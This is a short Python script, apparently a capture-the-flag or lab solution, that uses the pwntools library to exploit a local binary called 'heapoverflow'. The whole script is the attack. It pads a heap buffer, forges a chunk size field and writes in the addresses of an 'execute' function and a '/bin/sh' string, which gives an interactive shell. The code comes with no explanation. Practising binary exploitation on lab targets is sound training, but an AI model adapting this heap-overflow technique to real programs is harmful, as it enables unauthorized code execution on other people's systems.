#!/usr/bin/python
from pwn import *

r = process('./heapoverflow')
exe = ELF('./heapoverflow')

function = p64(exe.symbols['execute'])
sh = p64(next(exe.search('/bin/sh\x00')))
payload = 'a' * 20 + p64(0x21) + function + sh

r.sendline(str(0x87))
r.sendline(payload)

r.interactive()
